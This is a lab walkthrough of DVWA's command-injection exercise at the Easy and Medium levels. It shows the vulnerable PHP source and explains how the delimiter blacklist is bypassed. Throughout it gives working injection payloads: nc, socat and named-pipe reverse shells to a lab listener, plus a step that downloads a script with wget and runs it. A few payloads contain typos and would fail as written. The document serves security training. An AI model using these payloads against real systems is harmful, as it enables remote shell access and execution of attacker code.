# Command Execution

## Easy

### Exploit
This is a classic example of bash code injection. First examine the expected use case, (e.g. `192.168.56.1`) and obtain the following output.

```
PING 192.168.56.1 (192.168.56.1) 56(84) bytes of data.
64 bytes from 192.168.56.1: icmp_seq=1 ttl=64 time=0.152 ms
64 bytes from 192.168.56.1: icmp_seq=2 ttl=64 time=0.405 ms
64 bytes from 192.168.56.1: icmp_seq=3 ttl=64 time=0.585 ms

--- 192.168.56.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.152/0.380/0.585/0.179 ms
```

From this output, it's pretty clear the underlying PHP interpreter is probably `exec`ing something like `ping -c 3 ...`.

So, by simply following the `ping` with another command such delimited with either `;` or `&&`, we can get a shell. (e.g. `192.168.56.1;mkifio /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 | nc 192.168.56.1 4444 > /tmp/f;rm /tmp/f` for a reverse shell, assuming we have a listener on the attacking machine at 192.168.56.1:4444) Note that we could have used just about any reverse shell - nc, bash, php, python, etc - provided it is supported by the OS.

### Code Analysis
We can see by looking at the below form HTML and the request in the network tab that we're sending two `application/x-www-form-urlencoded` key-value pairs, one of which is the IP address to ping.
```
<form name="ping" action="#" method="post">
	<input type="text" name="ip" size="30">
	<input type="submit" value="submit" name="submit">
</form>
```

And the corresponding php is pretty much exactly what we'd expect: raw `shell_exec`ing of the unsanitized input, which allows us to inject any `;` or `&&`-delimited `bash` command as illustrated above. Note here is the outer `if` condition; if we were to send this request using an external HTTP client, (e.g. curl), we'd still need to include the `submit` parameter in addition to the `ip` parameter.

```php
<?php 

if( isset( $_POST[ 'submit' ] ) ) { 

    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command. 
    if (stristr(php_uname('s'), 'Windows NT')) {  
     
        $cmd = shell_exec( 'ping  ' . $target ); 
        echo '<pre>'.$cmd.'</pre>'; 
         
    } else {  
     
        $cmd = shell_exec( 'ping  -c 3 ' . $target ); 
        echo '<pre>'.$cmd.'</pre>'; 
         
    } 
     
} 
?>
```
## Medium
If we try this same exploitation method after setting the level to medium, we receive no output. A reasonable assumption - confirmed by examining the source code - is that the underlying PHP script is escaping the delimiter characters `;` and `&&`. More specifically, `str_replace` is used to replace these delmiters with the empty string. Because we only see stdout, we don't see the errors that would arise when the PHP interpreters attempts to run the command after it has been stripped of the aforementioned delimiters.

### Code Analysis
```php
<?php 

if( isset( $_POST[ 'submit'] ) ) { 

    $target = $_REQUEST[ 'ip' ]; 

    // Remove any of the charactars in the array (blacklist). 
    $substitutions = array( 
        '&&' => '', 
        ';' => '', 
    ); 

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
     
    // Determine OS and execute the ping command. 
    if (stristr(php_uname('s'), 'Windows NT')) {  
     
        $cmd = shell_exec( 'ping  ' . $target ); 
        echo '<pre>'.$cmd.'</pre>'; 
         
    } else {  
     
        $cmd = shell_exec( 'ping  -c 3 ' . $target ); 
        echo '<pre>'.$cmd.'</pre>'; 
         
    } 
} 

?>
```

### Exploit
So, how do we overcome this? By using backticks or `$()`, we can run a command BEFORE the ping is executed. We are still somewhat limited as we can't include the `;` or `&&` delimiters, but we do have a few options. Here are a few examples of very simple reverse shells which would work (assuming we have a listener on the attacking machine 192.168.56.1:4444).

1. `$(nc 192.168.56 4444 -e /bin/bash)`
2. `$(socat TCP4:192.168.56.1:4444 exec:"/bin/bash")`

Note that - using the first example - now the PHP interpreter sees `shell_exec('ping -c 3 $(nc 192.168.56 4444 -e /bin/bash)');`. Obviously, `ping` would not know what to make of the output of this subcommand, however the subcommand won't return until we close the reverse shell so it's not a problem.

I'm running DVWA on Metasploitable 2, hence the presence of `nc` and `socat`. In the real world it's unlikely that these tools would be installed; in this case, simply send 2 commands. In this case the ping will error after the subcommand returns, however it won't matter because the subcommand will have already completed its task (e.g. downloaded or executed the file).

1. Download a script (bash,php,python) or executable (exe,elf,etc)
   * e.g. `$(wget 192.168.56.1:80/reverse-shell-scripts/f -P /tmp/)`
2. Execute the script
   * e.g. `$(/tmp/f)`
